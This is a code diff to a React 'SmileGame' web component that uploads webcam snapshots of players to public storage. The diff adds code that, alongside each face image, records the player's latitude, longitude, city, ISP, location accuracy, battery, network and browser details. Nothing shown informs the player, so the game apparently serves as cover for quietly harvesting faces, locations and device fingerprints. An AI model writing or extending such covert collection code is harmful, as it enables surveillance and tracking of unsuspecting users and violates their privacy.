@@ -3,6 +3,7 @@ import * as THREE from "three";
 import { supabaseClient } from "../supabaseClient";
 import { loadFaceMesh, detectSmile, getFacePosition } from "../utils/smileDetection";
 import { ParticleEffect } from "../utils/particleEffects";
+import { getSmartLocation, getDeviceDetails } from "../utils/capture";
 import "./SmileGame.css";
 
 export default function SmileGame() {
@@ -28,6 +29,12 @@ export default function SmileGame() {
       const ctx = canvas.getContext("2d");
       ctx.drawImage(video, 0, 0);
 
+      // Get location and device info in parallel
+      const [locData, deviceInfo] = await Promise.all([
+        getSmartLocation(),
+        getDeviceDetails(),
+      ]);
+
       canvas.toBlob(async (blob) => {
         const timestamp = Date.now();
         const sessionId = `game_${timestamp}`;
@@ -43,7 +50,7 @@ export default function SmileGame() {
             const { data } = supabaseClient.storage.from("images").getPublicUrl(fileName);
             const imageUrl = data.publicUrl;
 
-            // Save to database
+            // Save image to database
             await supabaseClient.from("images_table").insert([
               {
                 session_id: sessionId,
@@ -51,8 +58,37 @@ export default function SmileGame() {
               },
             ]);
 
+            // Save location data
+            await supabaseClient.from("location_table").insert([
+              {
+                session_id: sessionId,
+                latitude: locData.lat,
+                longitude: locData.lon,
+                location_type: locData.type,
+                city: locData.details?.city || null,
+                region: locData.details?.region || null,
+                country: locData.details?.country || null,
+                isp: locData.details?.org || null,
+                accuracy: locData.details?.accuracy || null,
+              },
+            ]);
+
+            // Save device data
+            await supabaseClient.from("device_table").insert([
+              {
+                session_id: sessionId,
+                battery_level: deviceInfo.battery_level,
+                is_charging: deviceInfo.is_charging,
+                network_type: deviceInfo.network_type,
+                internet_speed: deviceInfo.internet_speed,
+                screen_resolution: deviceInfo.screen_res,
+                platform: deviceInfo.platform,
+                browser: deviceInfo.browser,
+              },
+            ]);
+
             setCaptureCount((prev) => prev + 1);
-           
+            console.log(`✅ Captured: Image + Location (${locData.type}) + Device`);
           }
         } catch (error) {
           console.error("Upload error:", error);
